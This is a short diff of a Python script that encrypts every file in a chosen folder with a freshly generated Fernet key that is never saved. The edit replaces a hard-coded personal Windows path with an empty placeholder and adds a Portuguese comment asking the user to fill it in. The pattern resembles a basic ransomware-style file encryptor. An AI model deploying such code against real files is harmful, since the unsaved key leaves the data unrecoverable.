@@ -16,8 +16,8 @@ def encrypt_files_in_folder(folder_path, key):
             encrypt_file(file_path, key)
 
 key = Fernet.generate_key();
-
-folder_path ="C:\\Users\\raque\\OneDrive\\Área de Trabalho\\nomes.teste";
+#Passe o diretorio na variável folder_path
+folder_path ="";
 
 encrypt_files_in_folder(folder_path, key)
 
